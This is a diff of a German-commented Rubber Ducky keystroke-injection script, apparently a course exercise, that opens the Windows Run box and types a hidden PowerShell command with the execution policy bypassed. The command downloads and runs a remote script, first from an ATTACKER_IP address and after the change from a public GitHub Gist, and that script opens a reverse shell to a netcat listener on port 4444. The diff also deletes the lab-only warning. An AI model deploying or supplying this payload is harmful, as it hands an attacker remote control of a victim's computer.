@@ -1,24 +1,25 @@
 REM ============================================================
-REM  W02a.5 – Rubber Ducky: Reverse Shell (Erweiterung von W02a.4)
+REM  W02a.5 – Rubber Ducky: Reverse Shell
 REM  Autoren: Raphael Bleier, Joachim Lugger
 REM  Ziel-OS: Windows
-REM  Beschreibung: Lädt das Reverse-Shell-Script vom Webserver.
-REM                Das externe Script (reverse_shell.ps1) baut
-REM                die Verbindung zurück zum Angreifer auf.
 REM
-REM  Voraussetzung:
-REM    1. nc -lvp 4444  (Listener auf Angreifer-Maschine starten)
-REM    2. Python-Server hostet reverse_shell.ps1 unter /payload.ps1
-REM  Ersetze ATTACKER_IP mit der echten IP-Adresse!
+REM  Das Payload-Script wird von einem öffentlichen GitHub Gist
+REM  geladen (HTTPS → kein lokaler Server nötig).
 REM
-REM  WARNUNG: Nur in gesicherter Laborumgebung verwenden!
-REM           Trellix Endpoint Security wird höchstwahrscheinlich
-REM           anschlagen und den Rechner vom Netz trennen!
+REM  WICHTIG: Die Reverse Shell selbst benötigt weiterhin eine
+REM  direkte IP-Verbindung (TCP) zum Listener – das ist technisch
+REM  unvermeidbar. ATTACKER_IP muss im selben Netz erreichbar
+REM  sein, oder über VPN/Tunnel zugänglich gemacht werden.
+REM
+REM  Setup:
+REM    1. nc -lvp 4444  (Listener auf Angreifer-Maschine)
+REM    2. ATTACKER_IP und PORT in reverse_shell.ps1 eintragen
+REM    3. reverse_shell.ps1 als öffentliches Gist hochladen
+REM    4. GIST_RAW_URL unten ersetzen
 REM ============================================================
 
 DELAY 2000
 
 GUI r
 DELAY 500
-STRINGLN powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8080/payload.ps1')"
-DELAY 5000
+STRINGLN powershell -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('GIST_RAW_URL');"
